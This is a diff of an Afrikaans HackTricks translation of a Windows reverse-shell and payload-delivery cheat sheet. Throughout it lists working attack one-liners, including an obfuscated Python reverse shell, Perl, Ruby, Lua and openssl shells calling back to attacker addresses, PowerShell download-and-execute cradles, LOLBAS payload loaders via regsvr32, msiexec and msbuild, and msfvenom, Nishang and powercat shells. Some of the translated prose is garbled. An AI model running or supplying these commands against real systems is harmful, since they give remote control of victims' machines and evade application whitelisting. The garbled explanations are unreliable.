@@ -8,16 +8,24 @@ Ander maniere om HackTricks te ondersteun:
 
 * As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
+* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
 
+**Probeer Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
+
 ## Lolbas
 
 Die bladsy [lolbas-project.github.io](https://lolbas-project.github.io/) is vir Windows soos [https://gtfobins.github.io/](https://gtfobins.github.io/) is vir Linux.\
-Duidelik is daar **geen SUID-lêers of sudo-voorregte in Windows nie**, maar dit is nuttig om te weet **hoe** sommige **binêre lêers** (mis)bruik kan word om sekere soorte onverwagte aksies uit te voer soos **willekeurige kode uitvoer.**
+Duidelik, **daar is nie SUID-lêers of sudo-voorregte in Windows nie**, maar dit is nuttig om te weet **hoe** sommige **binêre lêers** kan word (mis)bruik om sekere soorte onverwagte aksies uit te voer soos **uitvoer van willekeurige kode.**
 
 ## NC
 ```bash
@@ -43,6 +51,8 @@ uid=0(root) gid=0(root) groups=0(root)
 C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
 ```
 ## Perl
+
+Perl is 'n kragtige skriptaal wat dikwels gebruik word vir die skep van skadelike programme. Dit kan gebruik word om 'n terugvoerende skulpskoot te skep op 'n Windows-stelsel.
 ```bash
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
@@ -53,10 +63,6 @@ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen(
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## Lua
-
-### Lua
-
-Lua is 'n kragtige, effektiewe, en vinnige skriptaal wat dikwels gebruik word vir die skryf van skakelbare en aanpasbare sagteware. Dit word dikwels gebruik in die ontwikkeling van speletjies, webtoepassings, en ander sagtewareprojekte. Lua is maklik om te leer en bied 'n eenvoudige sintaksis wat dit 'n gewilde keuse maak vir ontwikkelaars wat vinnige prototipering en aanpassingsvermoëns benodig. Lua kan ook gebruik word vir die skryf van skadelike kodes en word soms deur aanvallers gebruik vir die uitvoering van aanvalle op stelsels en toepassings.
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -70,19 +76,7 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo wil
 ```
 ## Slachtoffer
 
-### Windows
-
-#### Windows Command Prompt
-
-Die Windows Command Prompt is 'n baie nuttige tool vir die uitvoering van verskeie take op 'n Windows-bedryfstelsel. Dit kan gebruik word vir die uitvoering van opdragte, skakeling tussen mappe, en die skep van lêers en mappe.
-
-#### PowerShell
-
-PowerShell is 'n kragtige skrips taal wat spesifiek ontwerp is vir Windows-bedryfstelsels. Dit bied 'n baie meer kragtige funksionaliteit as die Windows Command Prompt en kan gebruik word vir outomatisering, administrasie, en selfs aanvalle op 'n Windows-stelsel.
-
-#### Meterpreter
-
-Meterpreter is 'n kragtige rugsteun wat deel vorm van die Metasploit-raamwerk. Dit kan gebruik word vir die uitvoering van verskeie aanvalle op 'n Windows-stelsel, insluitend die verkryging van beheer oor die stelsel, die aflaai van lêers, en die uitvoering van opdragte.
+Die eerste stap in die aanval is om 'n slachtoffer te identifiseer. Dit kan 'n enkele rekenaar of 'n hele netwerk wees. Die keuse van 'n slachtoffer kan afhang van verskeie faktore, insluitend die doel van die aanval en die kwesbaarhede van die stelsel.
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -98,7 +92,7 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 Proses wat netwerkoproep uitvoer: **powershell.exe**\
-Lading geskryf op skyf: **NEE** (_ten minste nêrens wat ek kon vind deur procmon te gebruik!_)
+Lading geskryf op skyf: **GEEN** (_ten minste nêrens wat ek kon vind deur procmon te gebruik!_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
@@ -228,7 +222,7 @@ rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject(
 ```
 ## Regsvr32
 
-* [Van hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+* [Van hier af](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
 regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
@@ -297,8 +291,8 @@ msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > sh
 ```bash
 \\webdavserver\folder\batchfile.bat
 ```
-Proses wat 'n netwerkoproep uitvoer: **svchost.exe**\
-Laaibestand geskryf op skyf: **WebDAV-klient plaaslike cache**
+Proses wat netwerkoproep uitvoer: **svchost.exe**\
+Lading geskryf op skyf: **WebDAV-klient plaaslike cache**
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
 impacket-smbserver -smb2support kali `pwd`
@@ -316,7 +310,7 @@ Aanvaller
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
 python -m SimpleHTTPServer 80
 ```
-**Slachtoffer:**
+## Slachtoffer:
 ```
 victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```
@@ -350,8 +344,8 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-Jy kan hierdie tegniek gebruik om Toepassingswitlysing en Powershell.exe beperkings te omseil. Aangesien jy met 'n PS-skul gekonfronteer sal word.\
-Net aflaai en uitvoer: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
+Jy kan hierdie tegniek gebruik om Toepassingswitlysing en Powershell.exe-beperkings te omseil. Aangesien jy met 'n PS-skul gekonfronteer sal word.\
+Net aflaai en uitvoer dit: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
@@ -359,7 +353,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 
 ## **CSC**
 
-Kompileer C#-kode op die slagoffer se masjien.
+Stel C#-kode saam op die slagoffer se masjien.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
@@ -379,7 +373,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\fol
 
 ## Odbcconf
 
-* [Vanaf hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+* [Van hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
 odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
@@ -387,13 +381,13 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)
 
-## Powershell Skulpe
+## Powershell Doppe
 
 ### PS-Nishang
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-In die **Skulpe**-vouer is daar baie verskillende skulpe. Om Invoke-_PowerShellTcp.ps1_ af te laai en uit te voer, maak 'n kopie van die skripsie en voeg dit aan die einde van die lêer by:
+In die **Doppe**-vouer is daar baie verskillende doppe. Om Invoke-_PowerShellTcp.ps1_ af te laai en uit te voer, maak 'n kopie van die skripsie en voeg dit aan die einde van die lêer by:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
@@ -417,7 +411,7 @@ Defender ken dit nie as skadelike kode opspoor nie (nog nie, 3/04/2019).
 
 **Ander opsies wat deur powercat aangebied word:**
 
-Bind doppe, Omgekeerde dop (TCP, UDP, DNS), Poort omleiding, oplaai/aflaai, Genereer lading, Bedien lêers...
+Bind skulpe, Omgekeerde skulp (TCP, UDP, DNS), Poort omleiding, oplaai/aflaai, Genereer lading, Bedien lêers...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -456,7 +450,7 @@ Begin msfconsole met die geskepte hulpbron:
 ```
 msfconsole -r unicorn.rc
 ```
-Begin 'n webbediener wat die _powershell\_attack.txt_ lêer bedien en voer in die slagoffer uit:
+Begin deur 'n webbediener te begin wat die _powershell\_attack.txt_ lêer bedien en voer uit in die slagoffer:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
@@ -466,7 +460,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 
 [PS>Aanval](https://github.com/jaredhaight/PSAttack) PS-konsole met 'n paar aanvallige PS-modules wat vooraf gelaai is (gekodeer)\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
-WinPWN](https://github.com/SecureThisShit/WinPwn) PS-konsole met 'n paar aanvallige PS-modules en proksideteksie (IEX)
+WinPWN](https://github.com/SecureThisShit/WinPwn) PS-konsole met 'n paar aanvallige PS-modules en proksie-opsporing (IEX)
 
 ## Verwysings
 
@@ -478,15 +472,21 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS-konsole met 'n paar aanvall
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 * [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ​
+**Probeer Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
 <details>
 
-<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS hak van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Ander maniere om HackTricks te ondersteun:
 
 * As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
+* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
